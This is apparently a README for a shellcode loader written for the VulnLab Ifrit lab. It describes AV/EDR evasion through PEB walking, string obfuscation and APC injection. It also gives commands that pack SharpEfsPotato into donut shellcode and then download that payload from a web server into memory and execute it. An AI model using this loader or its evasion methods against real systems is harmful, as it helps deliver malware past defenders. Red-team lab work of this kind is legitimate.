# IfritLoader
Shellcode loader that I created to use for VulnLab's Ifrit.

The detections channel on VulnLab is always full of alerts from Ifrit, and before starting the lab I knew that I wanted to get through it without any high alerts. The loader that I created for Shinra probably would be sufficient, but I wasn't very happy with it. I'm not very happy with this loader either, but I do think it's better in all aspects. The main inspiration came from @usmansikander13's peb walking article. When scanning the Shinra loader with capa I noticed that it was detecting the dynamic function resolutions from the download. Nothing is ever perfect, but I wanted those detections gone, and peb walking made them disappear. I also added compile time string obfuscation, and changed from the standard `((void(*)())execMem)();` to APC injection, which I think works a bit better.

The donut generator requires donut shellcode: https://github.com/TheWover/donut
```
pip install donut-shellcode
```
It should work with any shellcode though, not only donut.

## Usage: 
Create your payload
```
python donutGenerator.py -i SharpEfsPotato.exe -b 1 --args='-p calc.exe' -x "HelloWorld"
```
Host the file on a web server and use the loader to download into memory and execute
```
.\IfritLoader.exe /p:http://example.com/payload.bin /x:HelloWorld
```
Omit -x or /x: if not using XOR functionality.

## References:
https://systemweakness.com/peb-walk-avoid-api-calls-inspection-in-iat-by-analyst-and-bypass-static-detection-of-1a2ef9bd4c94

https://maldevacademy.com/
